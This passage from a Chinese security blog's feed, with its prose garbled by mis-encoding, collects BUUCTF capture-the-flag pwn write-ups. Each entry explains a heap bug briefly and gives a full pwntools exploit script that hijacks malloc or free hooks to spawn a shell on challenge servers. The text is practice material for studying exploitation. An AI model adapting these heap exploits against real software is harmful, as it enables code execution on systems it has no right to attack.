title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h3><p><a href="https://blog.csdn.net/hengyunabc/article/details/7773449">https://blog.csdn.net/hengyunabc/article/details/7773449</a></p><p><a href="https://blog.csdn.net/marvie_xie/article/details/79042654">(44æ¡æ¶ˆæ¯) C++å­¦ä¹ ç¬”è®°ä¸€ï¼šcoutå¦‚ä½•åˆ¤æ–­è¾“å…¥æ•°æ®ç±»å‹_marvie_xieçš„åšå®¢-CSDNåšå®¢_c++åˆ¤æ–­è¾“å…¥æ•°æ®ç±»å‹</a></p><p><a href="https://www.runoob.com/cplusplus/cpp-overloading.html">C++ é‡è½½è¿ç®—ç¬¦å’Œé‡è½½å‡½æ•° | èœé¸Ÿæ•™ç¨‹ (runoob.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> å­¦ä¹ æ€»ç»“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTFåˆ·é¢˜è®°å½•</title>
      <link href="/posts/a90346a2.html"/>
      <url>/posts/a90346a2.html</url>
      
        <content type="html"><![CDATA[<h2 id="å†™åœ¨å‰é¢"><a href="#å†™åœ¨å‰é¢" class="headerlink" title="å†™åœ¨å‰é¢"></a>å†™åœ¨å‰é¢</h2><p>ç°åœ¨BUUç¬¬å…­é¡µå¿«åšå®Œäº†ï¼Œå‘ç°ç°åœ¨æœ‰çš„é¢˜ç›®åœ¨åšçš„æ—¶å€™ç¡®å®æ²¡æƒ³å‡ºæ¥ï¼Œä¸è¿‡çœ‹äº†ä¸€çœ¼å…¶ä»–å¸ˆå‚…çš„wpå°±å¾ˆå¿«å†™å‡ºæ¥äº†,å¦‚æœé’ˆå¯¹è¿™ç±»é¢˜ç›®å†å»å•ç‹¬å†™ä¸€ä»½wpåˆæ²¡å¤ªå¤šå¿…è¦ã€‚æ‰€ä»¥åœ¨ä¹‹åçš„åšå®Œçš„é¢˜ç›®é‡Œï¼Œæ²¡æœ‰å¿…è¦å•ç‹¬å†™ä¸€ç¯‡wpçš„é¢˜ç›®ä»¥åŠç›´æ¥åšå‡ºæ¥çš„é¢˜ç›®å°±éƒ½æ”¾åˆ°è¿™ç¯‡æ–‡ç« æ¥ç®€å•è®°å½•ä¸€ä¸‹äº†ã€‚</p><h2 id="hwb-2019-mergeheap"><a href="#hwb-2019-mergeheap" class="headerlink" title="hwb_2019_mergeheap"></a>hwb_2019_mergeheap</h2><p>mergeå‡½æ•°å¯ä»¥è®©ä¸¤ä¸ªå †å—çš„å†…å®¹åˆå¹¶ä¸€èµ·ï¼Œå¹¶ä¸”æ–°ç”³è¯·å‡ºæ¥ä¸€ä¸ªå¤§å †å—ã€‚è®©å†…å®¹åˆå¹¶åœ¨ä¸€èµ·çš„æ€è·¯æ˜¯å…ˆå¤åˆ¶ç¬¬ä¸€ä¸ªå †å—çš„æ•°æ®ï¼Œç„¶åå†æŠŠç¬¬äºŒä¸ªå †å—çš„æ•°æ®è¿½åŠ åˆ°ç¬¬ä¸€ä¸ªå †å—çš„åé¢ã€‚<strong>æ¼æ´æ˜¯è¿½åŠ çš„æ—¶å€™å¦‚æœæˆ‘ä»¬ç”³è¯·äº†ä¾‹å¦‚0x88 0x98 0xa8è¿™æ ·çš„å †å—å¹¶ä¸”å†™æ»¡äº†æ•°æ®ï¼Œé‚£ä¹ˆè¿˜ä¼šæŠŠç¬¬äºŒä¸ªå †å—çš„sizeä½ç»™è¿½åŠ ä¸Šå»ï¼Œä»è€Œæº¢å‡ºè¦†ç›–äº†ä¸‹ä¸€ä¸ªå †å—sizeä½</strong></p><p>åšä¸€ä¸ªå †å—é‡å æ‰“tcache poisoningå³å¯ã€‚æ³„éœ²libcåœ°å€çš„è¯ï¼Œå…ˆç”³è¯·ä¸¤ä¸ªå †å—(ä¿è¯åŠ èµ·æ¥çš„sizeå¤§äº0x410)ï¼Œç„¶ååˆå¹¶åå°†å¤§å †å—é‡Šæ”¾æ‰ï¼Œå†ç”³è¯·0x8çš„å †å—å‡ºæ¥ï¼Œå†™å…¥0x8ä¸ªå­—ç¬¦aï¼Œå¯¹å…¶æ‰§è¡Œshowå‡½æ•°ï¼Œå³å¯æ³„éœ²unsorted binçš„bkæŒ‡é’ˆ</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:28548&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content=<span class="string">&quot;/bin/sh\x00&quot;</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;len:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">idx1,idx2</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx1:&quot;</span>,<span class="built_in">str</span>(idx1))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx2:&quot;</span>,<span class="built_in">str</span>(idx2))</span><br><span class="line">    </span><br><span class="line">add(<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">0x300</span>)</span><br><span class="line"></span><br><span class="line">merge(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x300</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x8</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">libc_base=recv_libc()-<span class="number">0x3ec110</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x2c0</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x3d0</span>)</span><br><span class="line">add(<span class="number">0x208</span>,<span class="string">&quot;b&quot;</span>*<span class="number">0x208</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x300</span>)<span class="comment">#index 6</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&quot;spk_chunk&quot;</span>)</span><br><span class="line">add(<span class="number">0xf0</span>)</span><br><span class="line">add(<span class="number">0xf0</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">merge(<span class="number">5</span>,<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x1094</span>,<span class="number">0x10A0</span>,<span class="number">0x10AC</span>,<span class="number">0x10B8</span>,<span class="number">0x1018</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">payload=<span class="string">b&quot;u&quot;</span>*<span class="number">0x100</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>)+p64(free_hook)</span><br><span class="line">add(<span class="number">0x300</span>,payload)</span><br><span class="line">add(<span class="number">0xf0</span>)</span><br><span class="line">add(<span class="number">0xf0</span>,p64(sys_addr))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211231526971.png"></p><h2 id="jarvisoj-itemboard"><a href="#jarvisoj-itemboard" class="headerlink" title="jarvisoj_itemboard"></a>jarvisoj_itemboard</h2><p>æœ¬é¢˜æ˜¯æ§åˆ¶å †å—é‡Œå­˜æ”¾äº†deleteçš„å‡½æ•°æŒ‡é’ˆï¼Œå¹¶ä¸”å­˜åœ¨UAFæ¼æ´ï¼Œå­˜åœ¨showå‡½æ•°å¸¸è§„æ³„éœ²libcåœ°å€å³å¯ã€‚å°†ä¸¤ä¸ªæ§åˆ¶å †å—éƒ½æ”¾å…¥fast biné‡Œï¼Œç„¶åç”³è¯·ä¸æ§åˆ¶å †å—ç­‰å¤§çš„å †å—ï¼Œå°±å¯ä»¥å»æ§åˆ¶å…¶ä¸­çš„ä¸€ä¸ªæ§åˆ¶å †å—ï¼Œå°†é‡Œé¢çš„å‡½æ•°æŒ‡é’ˆæ”¹ä¸ºsystemåœ°å€ï¼Œæ­¤æ—¶æƒ…å†µä¸º:</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211231756781.png" alt="image-20221123175606412"></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:28353&quot;</span>,<span class="string">&quot;buu64-libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,name=<span class="string">&quot;/bin/sh\x00&quot;</span>,content=<span class="string">&quot;/bin/sh\x00&quot;</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choose:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Item name?\n&quot;</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Description&#x27;s len?\n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Description?&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choose:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Which item?\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choose:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Which item?\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">list</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choose:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    </span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base=recv_libc()-<span class="number">0x3c4b78</span></span><br><span class="line">sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base +<span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0xFBA</span>,<span class="number">0xFC6</span>,<span class="number">0xFD2</span>,<span class="number">0xFDE</span>,<span class="number">0xB4F</span>,<span class="number">0xCCB</span>)</span><br><span class="line">payload=<span class="string">b&quot;/bin/sh;aaaaaaaa&quot;</span>+p64(sys_addr)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;uuuu&#x27;</span>,payload)</span><br><span class="line">log_addr(<span class="string">&quot;sys_addr&quot;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ciscn-2019-c-3"><a href="#ciscn-2019-c-3" class="headerlink" title="ciscn_2019_c_3"></a>ciscn_2019_c_3</h2><p>æœ¬é¢˜å­˜åœ¨ä¸¤ä¸ªæ¼æ´ï¼Œä¸€ä¸ªæ˜¯UAFï¼Œä¸€ä¸ªæ˜¯å †æº¢å‡º(å¯ä»¥æº¢å‡º0x10ä¸ªå­—èŠ‚ï¼Œä½†ä»£ä»·æ˜¯æ— æ³•æ§åˆ¶fdå’ŒbkæŒ‡é’ˆ)</p><p>ç”±äºæ˜¯2.27çš„libcï¼Œæ‰€ä»¥å°±double free,é‡Šæ”¾åŒä¸€ä¸ªå †å—8æ¬¡ï¼Œè®©å…¶è¿›å…¥unsorted binï¼Œæ³„éœ²libcåœ°å€ã€‚</p><p>æ¥ä¸‹æ¥æœ‰ä¿©æ€è·¯ï¼Œç¬¬ä¸€æ˜¯åˆ©ç”¨å †æº¢å‡ºç¯¡æ”¹sizeç„¶åæ‰“å †å—é‡å +tcache poisoningåŠ«æŒfree_hookï¼›ç¬¬äºŒæ˜¯åˆ©ç”¨ç¨‹åºé‡Œä¸€ä¸ªbackdoorå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°å¯ä»¥è®©æŸä¸ªå †å—çš„fdæŒ‡é’ˆåŠ ä¸Šä¸€ä¸ªå°çš„å€¼ï¼Œå…ˆæ‰“double freeè®©fdæŒ‡é’ˆæ˜¯ä¸€ä¸ªå †å—çš„åœ°å€ï¼Œç„¶åä¸æ–­è§¦å‘backdoorå°†fdæŒ‡å‘free_hookçš„ä½ç½®å†å°†å…¶ç”³è¯·å‡ºæ¥åŠ«æŒï¼Œæœ€åå†™å…¥ä¸€ä¸ªone_gadgetçš„åœ°å€å³å¯</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:26543&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content=<span class="string">&quot;/bin/sh\x00&quot;</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Command: \n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;size: \n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Give me the name: \n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Command: \n&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;weapon:\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Command: \n&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index: \n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;attack_times: &quot;</span>)</span><br><span class="line"></span><br><span class="line">libc_base=<span class="built_in">int</span>(p.recv(<span class="number">15</span>))-<span class="number">0x3ebca0</span></span><br><span class="line">log_info(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(free_hook-<span class="number">0x10</span>))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Command: \n&quot;</span>,<span class="built_in">str</span>(<span class="number">666</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;weapon:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x12D1</span>,<span class="number">0x12DD</span>,<span class="number">0x12E9</span>,<span class="number">0x130B</span>)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(search_og(<span class="number">1</span>)+libc_base))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211252054342.png" alt="image-20221125205436933"></p><h2 id="nsctf-online-2019-pwn2"><a href="#nsctf-online-2019-pwn2" class="headerlink" title="nsctf_online_2019_pwn2"></a>nsctf_online_2019_pwn2</h2><p>æœ¬é¢˜çš„æ¼æ´åœ¨äºè¿™ä¸ªå‡½æ•°å¦‚ä¸‹</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211252222277.png" alt="image-20221125222254210" style="zoom:50%;" /><p>è¯¥å‡½æ•°å¯ä»¥æº¢å‡ºåˆ°bssæ®µ0x202090çš„è¿™ä¸ªåœ°æ–¹ï¼Œä»è€Œç¯¡æ”¹ä¸€å­—èŠ‚ï¼Œå°±ç›¸å½“äºå¯ä»¥ä»»æ„å †åœ°å€å†™ï¼Œä»»æ„å †åœ°å€è¯»ï¼Œä»»æ„å †åœ°å€é‡Šæ”¾(å‰ææ˜¯åœ°å€èŒƒå›´éƒ½æ˜¯åœ¨å¯æ§çš„æœ€åä¸€å­—èŠ‚)ã€‚æ¥ç€å°±å»æ‰“å †å—é‡å æ³„éœ²libcåœ°å€ï¼Œç„¶åæ‰“fastbin attackå³å¯ã€‚</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:26263&quot;</span>,<span class="string">&quot;buu64-libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;6.exit\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input the size\n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;6.exit\n&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;6.exit\n&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">input_size</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;6.exit\n&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Please input your name&quot;</span>,size)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">input_content</span>(<span class="params">content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;6.exit\n&quot;</span>,<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input the note\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input your name&quot;</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#overflow chunk</span></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#Tampering chunk</span></span><br><span class="line">add(<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">0xa0</span>)</span><br><span class="line"></span><br><span class="line">input_size(<span class="string">&#x27;b&#x27;</span>*<span class="number">0x30</span>+<span class="string">&#x27;\x10&#x27;</span>)</span><br><span class="line"></span><br><span class="line">input_content(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xb1</span>))</span><br><span class="line">input_size(<span class="string">&#x27;b&#x27;</span>*<span class="number">0x30</span>+<span class="string">&#x27;\x40&#x27;</span>)</span><br><span class="line">delete()</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">input_size(<span class="string">&#x27;b&#x27;</span>*<span class="number">0x30</span>+<span class="string">&#x27;\xb0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">libc_base=recv_libc()-<span class="number">0x3c4b78</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">malloc_hook=libc_base+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">realloc=libc_base+libc.symbols[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">input_size(<span class="string">&#x27;b&#x27;</span>*<span class="number">0x30</span>+<span class="string">&#x27;\x40&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete()</span><br><span class="line">add(<span class="number">0x38</span>)</span><br><span class="line">input_size(<span class="string">&#x27;b&#x27;</span>*<span class="number">0x30</span>+<span class="string">&#x27;\x10&#x27;</span>)</span><br><span class="line"></span><br><span class="line">input_content(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">input_content(<span class="string">b&quot;a&quot;</span>*<span class="number">0xb</span>+p64(search_og(<span class="number">1</span>)+libc_base)+p64(realloc+<span class="number">12</span>))</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0xCFF</span>,<span class="number">0xD0B</span>,<span class="number">0xD17</span>,<span class="number">0xD23</span>,<span class="number">0xD2F</span>)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211252226217.png" alt="image-20221125222657876"></p><h2 id="metasequoia-2020-samsara"><a href="#metasequoia-2020-samsara" class="headerlink" title="metasequoia_2020_samsara"></a>metasequoia_2020_samsara</h2><p>æœ¬é¢˜çš„æ¼æ´æ˜¯å­˜åœ¨UAFå’Œåé—¨å‡½æ•°ï¼Œåªéœ€è¦è®©æ ˆé‡Œçš„ä¸€ä¸ªå˜é‡ä¸º0xdeadbeefå³å¯ï¼Œè€Œç¨‹åºè‡ªå·±æ³„éœ²äº†æ ˆåœ°å€ï¼Œå¹¶ä¸”å¯ä»¥åœ¨éœ€è¦ç¯¡æ”¹çš„å˜é‡çš„ä½åœ°å€å¤„å†™å…¥ä¸€ä¸ª64ä½æ— ç¬¦å·æ•°ã€‚æ‰€ä»¥æ‰“ä¸€ä¸ªhouse of spiritå³å¯è§¦å‘åé—¨ã€‚</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:29238&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice &gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice &gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index:\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">input_1</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice &gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index:\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Ingredient:\n&quot;</span>,<span class="built_in">str</span>(content))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice &gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">move</span>(<span class="params">content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice &gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Which kingdom?\n&quot;</span>,<span class="built_in">str</span>(content))</span><br><span class="line">    </span><br><span class="line">add()</span><br><span class="line">add()</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">stack_addr=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">log_addr(<span class="string">&#x27;stack_addr&#x27;</span>)</span><br><span class="line">move(<span class="number">0x21</span>)</span><br><span class="line"></span><br><span class="line">input_1(<span class="number">0</span>,stack_addr-<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">add()</span><br><span class="line">add()</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0xB99</span>,<span class="number">0xC02</span>,<span class="number">0xC57</span>,<span class="number">0xCCF</span>,<span class="number">0xCE9</span>,<span class="number">0xC9A</span>)</span><br><span class="line">input_1(<span class="number">3</span>,<span class="number">0xdeadbeef</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice &gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">6</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211261111067.png" alt="image-20221126111155652"></p><h2 id="huxiangbei-2019-hacknote"><a href="#huxiangbei-2019-hacknote" class="headerlink" title="huxiangbei_2019_hacknote"></a>huxiangbei_2019_hacknote</h2><p>æœ¬é¢˜æ˜¯é™æ€é“¾æ¥çš„é¢˜ç›®(ä»»ä½•ä¿æŠ¤éƒ½æ²¡æœ‰)ï¼Œåœ¨editå‡½æ•°é‡Œå­˜åœ¨ä¸€ä¸ªoff by 